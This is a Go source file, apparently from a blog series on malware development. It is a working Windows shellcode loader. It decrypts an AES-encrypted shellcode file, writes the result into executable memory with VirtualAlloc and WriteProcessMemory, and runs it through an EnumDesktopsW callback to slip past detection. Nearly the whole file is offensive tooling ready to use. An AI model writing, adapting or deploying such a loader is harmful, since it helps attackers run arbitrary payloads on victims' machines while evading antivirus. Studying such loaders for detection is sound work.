package main

/*

Author: D3Ext
Blog post: https://d3ext.github.io/malware-dev-9/

*/

import (
  "os"
  "fmt"
  "log"
  "flag"
  "time"
  "errors"
  "unsafe"
  "io/ioutil"
  "crypto/aes"
  "crypto/cipher"

  "golang.org/x/sys/windows"
)

func Decrypt(ciphertext []byte, pass []byte) ([]byte, error) {
  // Init decipher
  block, err := aes.NewCipher(pass)
  if err != nil {
    return []byte(""), err
  }

  if (len(ciphertext) % aes.BlockSize) != 0 {
    return []byte(""), errors.New("wrong blocksize!")
  }

	// Get IV from ciphertext
	iv := ciphertext[:aes.BlockSize]
  fmt.Println("\n[*] AES IV:", iv)

	// Decryption
	decodedCipherMsg := ciphertext[aes.BlockSize:]
	cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
	cfbDecrypter.XORKeyStream(decodedCipherMsg, decodedCipherMsg)

	// Remove padding
  length := len(decodedCipherMsg)
  paddingLen := int(decodedCipherMsg[length-1])
  result := decodedCipherMsg[:(length - paddingLen)]
  
  return result, nil
}

func main(){
  var file string
  var key string

  flag.StringVar(&file, "f", "", "")
  flag.StringVar(&key, "k", "ExampleKey123456", "")
  flag.Parse()
  pass := []byte(key)

  if (file == "") {
    fmt.Println("Usage: .\\extra.exe -f shellcode.enc -k ExampleKey123456\n")
    flag.PrintDefaults()
    os.Exit(0)
  }

  enc_shellcode, err := ioutil.ReadFile(file)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("[*] Encrypted shellcode:")
  for _, b := range enc_shellcode {
    fmt.Printf("0x%X, ", b)
  }

  shellcode, err := Decrypt(enc_shellcode, pass)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("[*] Decrypted shellcode:")
  for _, b := range shellcode {
    fmt.Printf("0x%X, ", b)
  }

  // Load DLLs
  user32 := windows.NewLazyDLL("user32.dll")
  kernel32 := windows.NewLazyDLL("kernel32.dll")

  // Import calls
  EnumDesktopsW := user32.NewProc("EnumDesktopsW")
  GetProcessWindowStation := user32.NewProc("GetProcessWindowStation")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

  fmt.Println("\nCalling VirtualAlloc...")
  address, _, _ := VirtualAlloc.Call(
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_EXECUTE_READWRITE,
  )

  pHandle, _, _ := GetCurrentProcess.Call()
  size := uintptr(len(shellcode))

  fmt.Println("Calling WriteProcessMemory...")
  WriteProcessMemory.Call(
    pHandle,
    address,
    uintptr(unsafe.Pointer(&shellcode[0])),
    uintptr(unsafe.Pointer(&size)),
  )

  winProc, _, _ := GetProcessWindowStation.Call()
  fmt.Println("Calling EnumDesktopsW...")
  _, _, err = EnumDesktopsW.Call(winProc, address, 0)
  if err != nil {
    log.Fatal(err)
  }

  time.Sleep(10000 * time.Millisecond)
  fmt.Println("Success!")
}


